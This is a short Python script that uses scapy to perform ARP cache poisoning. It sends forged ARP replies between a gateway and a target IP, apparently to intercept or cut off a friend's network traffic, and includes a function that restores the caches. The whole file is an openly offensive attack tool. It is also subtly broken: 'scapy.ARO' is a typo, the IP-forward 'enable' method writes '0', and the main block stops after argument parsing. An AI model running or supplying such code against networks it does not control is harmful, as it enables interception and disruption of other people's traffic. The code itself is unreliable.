#! /usr/bin/env python3
from email import parser
import scapy.all as scapy
import sys
#import os
import argparse
from datetime import datetime
from time import sleep as pause
import time



# request = scapy.ARP()

# request.pdst = '137.112.228.214/24'
# broadcast = scapy.Ether()

# broadcast.dst = 'ff:ff:ff:ff:ff:ff'

# request_broadcast = broadcast / request
# clients = scapy.srp(request_broadcast, timeout=1)[0]
# for element in clients:
#     print(element[1].psrc + "     " + element[1].hwsrc)

class PreAttack(object):
    def __init__(self, targ, iface):
        self.target = targ
        self.interface = iface
    def getMacNCheese(self):
        return scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARO(pdst=self.target),
        timeout=10, iface=self.interface)[0][0][1][scapy.ARP].hwsrc
    class togggleIPForward(object):
        def __init__(self, path='/proc/sys/net/ipv4/ip_forward'):
            self.path = path
        def enableIPForward(self):
            with open(self.path, 'wb') as file:
                file.write('0')
            return 0
class Attack(object):
    def __init__(self, targs, iface):
        self.targ1 = targs[0]
        self.targ2=targs[1]
        self.iface = iface
    def KuzcosPoison(self, MacNCheese):
        scapy.send(scapy.ARP(op=2, pdst=self.targ1, psrc=self.targ2, hwdst=MacNCheese[0]), iface=self.iface)
        scapy.send(scapy.ARP(op=2, pdst=self.targ2, psrc=self.targ1, hwdst=MacNCheese[1]), iface=self.iface)
    def FixItFelix(self, MacNCheese):
        scapy.send(scapy.ARP(op=2, pdst=self.targ1, psrc=self.targ2, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=MacNCheese[0]), iface=self.iface)
        scapy.send(scapy.ARP(op=2, pdst=self.targ2, psrc=self.targ1, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=MacNCheese[1]), iface=self.iface)
            
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='R.O.S.I.E Guardian Angel Tool')
    parser.add_argument('-i', '--interface', help='Network interface to attack on', action='store', dest='interface', default=False)
    parser.add_argument('-t1', '--target1', help='Gateway target', action='store', dest='target1', default=False)
    parser.add_argument('-t2', '--target2', help='Friend who needs to touch grass IP', action='store', dest='target2', default=False)
    parser.add_argument('-f', '--forward', help='Auto-toggle IP forwarding', action='store_true', dest='fwd', default=False)
    
    args = parser.parse_args()
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    elif ((not args.target1) or (not args.target2)):
        parser.error("Invalid Targets")
        sys.exit(1)
    elif not args.interface:
        parser.error("No network interface given")
        sys.exit(1)
